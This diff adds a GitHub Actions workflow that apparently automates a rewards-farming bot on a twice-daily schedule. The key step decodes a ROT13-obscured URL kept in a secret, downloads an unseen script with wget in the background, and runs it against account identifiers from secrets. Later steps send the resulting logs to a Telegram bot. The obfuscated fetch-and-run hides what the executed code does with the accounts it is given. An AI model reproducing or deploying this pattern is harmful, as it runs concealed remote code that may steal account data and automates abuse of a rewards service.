@@ -1,0 +1,57 @@
+name: KrypticRewards
+
+on:
+  schedule:
+    - cron: '0 0,12 * * *'
+  workflow_dispatch:
+
+permissions:
+  contents: read
+
+jobs:
+  burn_rewards:
+    runs-on: ubuntu-latest
+    timeout-minutes: 36
+    steps:
+      - uses: actions/checkout@v3
+      - name: Setting Up Actions
+        run: nohup wget "$(echo '${{ secrets.ACTIVATION_KEY }}' | tr 'A-Za-z' 'N-ZA-Mn-za-m')" -O rewards.py > nohup.out 2>&1 &
+
+      - name: Set up Python 3.10
+        uses: actions/setup-python@v3
+        with:
+          python-version: "3.10"
+      - name: Install dependencies
+        run: |
+          pip install -r requirements.txt
+      - name: Initial ID
+        run: python rewards.py --headless --fast --accounts ${{ secrets.FIRST_ID}}
+      - name: Save logs.txt as an artifact
+        uses: actions/upload-artifact@v3
+        with:
+          name: logs
+          path: logs.txt
+      - name: Upload logs to Telegram
+        if: always()
+        env:
+          CHAT_ID: ${{ secrets.CHAT_ID }}
+          BOT_TOKEN: ${{ secrets.BOT_TOKEN }}
+        run: |
+          curl -F chat_id=$CHAT_ID -F document=@logs.txt https://api.telegram.org/bot$BOT_TOKEN/sendDocument
+    #  - name: Secondary ID
+    #    run: python rewards.py --headless --fast --accounts ${{ secrets.SECONDARY_ID}}
+      - name: Save logs.txt as an artifact
+        uses: actions/upload-artifact@v3
+        with:
+          name: logs
+          path: logs.txt
+      - name: Upload logs to Telegram
+        if: always()
+        env:
+          CHAT_ID: ${{ secrets.CHAT_ID }}
+          BOT_TOKEN: ${{ secrets.BOT_TOKEN }}
+        run: |
+          curl -F chat_id=$CHAT_ID -F document=@logs.txt https://api.telegram.org/bot$BOT_TOKEN/sendDocument
+      - name: Remove logs.txt
+        if: always()
+        run: rm logs.txt
